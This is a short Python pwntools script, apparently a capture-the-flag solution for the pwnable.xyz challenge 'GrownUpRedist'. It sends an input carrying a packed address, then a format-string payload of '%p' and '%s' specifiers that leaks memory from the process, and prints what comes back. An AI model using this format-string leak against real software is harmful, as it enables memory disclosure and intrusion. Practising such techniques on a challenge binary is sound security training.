from pwn import *

# def char_range(c1, c2):
#     """Generates the characters from `c1` to `c2`, inclusive."""
#     for c in range(ord(c1), ord(c2)+1):
#         yield chr(c)

p = process('./GrownUpRedist')
# p = remote('svc.pwnable.xyz', 30004)

p.recvuntil(': ')
payload = b'y1111111' + p32(0x601080)
p.sendline(payload)
p.recvuntil(': ')

# context.log_level = 'debug'
# gdb.attach(p)
# payload = b''
# for ch in char_range('a', 'z'):
#     payload += ch.encode() * 8
# gdb.attach(p)

payload = b'a'*32 +b'%p  '*8 + b'%s  ' + b'%p  '*7 + b'a'*33


p.send(payload)
p.recvuntil('Welcome ')
log.info('recieved :')

log.info(p.recv())
